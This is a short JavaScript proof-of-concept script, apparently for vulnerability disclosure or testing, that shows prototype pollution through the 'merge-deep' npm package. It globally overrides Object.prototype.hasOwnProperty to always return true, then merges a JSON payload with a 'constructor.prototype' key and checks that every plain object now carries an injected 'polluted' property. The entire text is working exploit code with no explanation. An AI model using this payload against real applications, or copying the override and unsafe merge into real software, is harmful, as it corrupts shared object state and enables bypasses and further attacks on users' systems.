Object.prototype.hasOwnProperty = () => true;
console.log({}.polluted);
const merge = require('merge-deep');
const malicious_payload = '{"constructor": {"prototype": {"polluted":"yes"}}}';
merge({}, JSON.parse(malicious_payload));
console.log({}.polluted);